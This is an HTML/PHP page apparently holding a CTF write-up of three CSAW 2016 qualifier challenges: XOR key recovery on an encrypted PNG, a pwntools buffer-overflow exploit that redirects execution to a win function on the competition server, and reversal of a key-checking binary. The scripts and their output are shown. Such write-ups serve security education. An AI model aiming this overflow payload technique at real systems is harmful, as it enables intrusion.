<!DOCTYPE html>
<html lang="en">

<?php
include('../includes/headers.php');
include('../includes/navbar.php');
include('../includes/footers.php');
print getHeaders('CSAW-Quals-2016',1);
?>
<body>

    <!-- Navigation -->
    <?php
        print getNavbar(1);
    ?>
    <!-- Page Header -->
    <!-- Set your background image for this header on the line below. -->
    <header class="intro-header" >
        <div class="container">
            <div class="row">
                <div class="col-lg-6 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="post-heading">
                        <h1>CSAW CTF </h1>
                        <h2 class="subheading">
                            Qualification Round 2016 <img src="../img/csaw.png" alt="csaw" align="right"align = "center" align = "center" >
                        </h2>
                        <span class="meta">Posted by <a href="#">kablaa: </a> September, 2016</span>
                    </div>
                </div>
            </div>
        </div>
    </header>


    <!-- Challenge List -->
    <div class="container">
        <div class = "row">
                <div class="post-body col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">
                    <div claa = "list-group">
                        <a href="#sleeping_guard" class = "list-group-item">Sleeping Guard <span class ="badge">Crypto-50</span></a>
                        <a href="#warmup" class = "list-group-item">Warmup<span class ="badge">Pwn-50</span></a>
                        <a href="#rock" class = "list-group-item">Rock<span class ="badge">Reversing-100</span></a>
                    </div>
                </div>
        </div>
    </div>


    <!-- Post Content -->
    <article>
        <div class="container">
            <div class="row">
                <div class="post-body col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">

                    <!-- sleeping Guard -->

                    <div id="sleeping_guard">
                        <h1>Sleeping Guard (Crypto 50)</h1>
                        <p>
                        With this challenge, they gave us an encrypted png. After a bit of trial and error I realized all I had to do was <code>xor</code> the first few bytes of the encrypted file with the standard header of a png. I just downloaded a sample file. Here is my <code>get_key.py</code>
                         <pre>
                             <code class= "language-python">
ecrypted = open('sleeping.png','rb').read().decode('base64')
png = open('sample.png','rb').read()

key = ""
for i in range(0,30):
    key += chr(ord(ecrypted[i]) ^ ord(png[i]))
print key
                            </code>
                        </pre>
                        Which gave me the key:
                        <pre>
python get_key.py
WoAh_A_Key!?WoAh_A]?ey#?WoAh_?
                        </pre>
                        Here is my <code>decrypt.py</code>
                        <pre>
                            <code class = "language-python">
key = "WoAh_A_Key!?"
encrypted = open('sleeping.png','rb').read().decode('base64')
out = open('decrypted.png','wb')

for i in range(0,len(encrypted)):
    decrypted = chr(ord(encrypted[i]) ^ (ord(key[i % len(key)])))
    out.write(decrypted)
out.close()
                            </code>
                        </pre>
                        Which gave me the image with the flag:
                        <img src="../img/csaw.2016.sleeping_guard.decrypted.png" alt="sleeping" align = "center" align = "center" align = "center" >
                    </p>


                    <!-- Warmup -->
                    <h1 id = "warmup">Warmup (Pwn 50)</h1>
                    <p>
                    This was a very easy challenge. Basically, there was a win function at the address that is bring printed : <code>0x40060D</code>. This function can be called with a simple buffer overflow. Here is my Exploit.py
                    <pre>
                        <code class ="language-python">
from pwn import *

win = 0x40060D

payload = "A"*72
payload += p64(win)
con = remote('pwn.chal.csaw.io',8000)

print con.recvline()
print con.recvline()
con.sendline(payload)
print con.recvline()

                        </code>
                    </pre>
                        Which gave me the falg
                    <pre>
[+] Opening connection to pwn.chal.csaw.io on port 8000: Done
-Warm Up-

WOW:0x40060d

>FLAG{LET_US_BEGIN_CSAW_2016}

[*] Closed connection to pwn.chal.csaw.io port 8000

                    </pre>
                    </p>



                    <!-- Rock -->
                    <h1 id="rock">Rock (Reversing 100)</h1>
                    <p>
                        There is a struct in this program.
                        <pre>
                            <code class='language-cpp'>
struct Rock{
    void *fp;
    int pass_fail;
    string *user_input1;
    string *user_input2;
    string *flag_str;
};
                            </code>
                        </pre>
                    </p>
                    Three interesting functions, which I have called <code>init_struct</code>, <code>check_len_and_xor</code>, and <code>is_valid_key</code>
                    <h2>init_struct</h2>
                    <img src="../img/csaw.2016.rock.init_struct.png" alt="init_struct">
                    This function initializes the fields in the Rock struct. First, the <code>pass_fail</code> field is set to 0 (pass). Then, the user input fields are populated with the string that is provided by the user. Finally, the <code>flag_str</code> field is populated with the string <code>FLAG23456912365453475897834567</code>.
                    <h2>check_len_and_xor</h2>
                    <img src="../img/csaw.2016.rock.check_len_and_xor.png" alt="check_len_and_xor">
                    This seems to be the function were all of the important stuff happens. First, it checks to make sure the length of the input is <code>0x1e</code> or 30. Then it takes every byte of the input and applies the following changes:
                    <pre>
                        <code class="language-cpp">
for(i = 0; i &lt length(rockStruct -> user_input1); i++{
    rockStruct ->user_input[i] = (rockStruct ->user_input[i] ^ 80) + 20;
}
for(j = 0; j &lt length(rockStruct ->user_input1); j++{
    rockStruct ->user_input[j] = (rockStruct ->user_input[j] ^ 16) + 9;
}
                        </code>
                    </pre>
                    <h2>is_valid_key</h2>
                    <img src="../img/csaw.2016.rock.is_valid_key.png" alt="is_valid_key">
                    Finally, this function checks each bye of the "encypted" user input against each byte of  <code>FLAG23456912365453475897834567</code>.
                    <pre>
                        <code class="language-cpp">
for(i = 0; i &lt length(rockStruct->user_input1) ; i++){
    if(rockStruct->user_input1[i] != rockStruct->flag_str[i]){
        cout &lt&lt "you did not pass" &lt&lt i;
        rockStruct->pass_fail = 1;
        return rockStruct->pass_fail;
    }
    cout &lt&lt "pass" &lt&lt i;
}
return rockStruct->pass_fail;
                        </code>
                    </pre>


                    <p>
                    Here is my <code>decrypt.py</code> script.
                    <pre>
                        <code class='language-python'>
s1 = "FLAG23456912365453475897834567"
s2 = ""
for c in s1:
    x = ord(c)
    s2 += chr((((x -9)^16) - 20)^80)
print s2
                        </code>
                    </pre>
                    which gave me the key:
                    <pre>
...
Pass 27
Pass 28
Pass 29
/////////////////////////////////
Do not be angry. Happy Hacking :)
/////////////////////////////////
Flag{IoDJuvwxy\tuvyxwxvwzx{\z{vwxyz}
                    </pre>
                    </p>


                    <!-- END POST -->
                    </div>
                </div>
            </div>

        </article>
    <hr>


    <!-- Footer -->
    <?php
        print getFooters();
    ?>

</body>

</html>
